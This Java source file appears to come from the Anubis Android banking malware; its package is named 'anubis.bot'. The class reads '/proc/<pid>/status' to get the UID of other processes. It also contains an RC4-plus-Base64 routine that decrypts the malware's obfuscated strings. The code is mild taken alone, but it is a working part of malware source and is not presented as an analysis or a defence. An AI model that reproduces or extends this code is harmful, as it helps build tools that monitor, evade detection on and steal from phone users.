package anubis.bot.myapplication.API.ProcessesSDK6;

import android.util.Base64;

import java.io.IOException;
import java.util.Locale;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public class classProcSTATUS extends classProcFile {
  UtilsClass SF = new UtilsClass();
  public String str_decrypt(String textDE_C, String key)
  {
    UtilsClass utilsClass = new UtilsClass();
    try
    {
      byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
      textDE_C = new String(data, "UTF-8");
      byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
      ClassRC4 rcd = new ClassRC4(key.getBytes());
      return  new String(rcd.decrypt(detext));
    }catch (Exception ex){ }
    return "";
  }


  public static classProcSTATUS get(int pid) throws IOException {
    UtilsClass SF = new UtilsClass();
    return new classProcSTATUS(String.format(Locale.ENGLISH, "/proc/%d/status", pid));
  }
  private classProcSTATUS(String path) throws IOException {
    super(path);
  }

  public String getValue(String fieldName) {
    UtilsClass SF = new UtilsClass();
     String[] lines = content.split("\n");
    for (String line : lines) {
      if (line.startsWith(fieldName + ":")) {
        return line.split(fieldName + ":")[1].trim();
      }
    }
    return null;
  }
  public int getUid() {
    UtilsClass SF = new UtilsClass();
    try {
       return Integer.parseInt(getValue("Uid").split("\\s+")[0]);
    } catch (Exception e) {
       return -1;
    }
  }
}
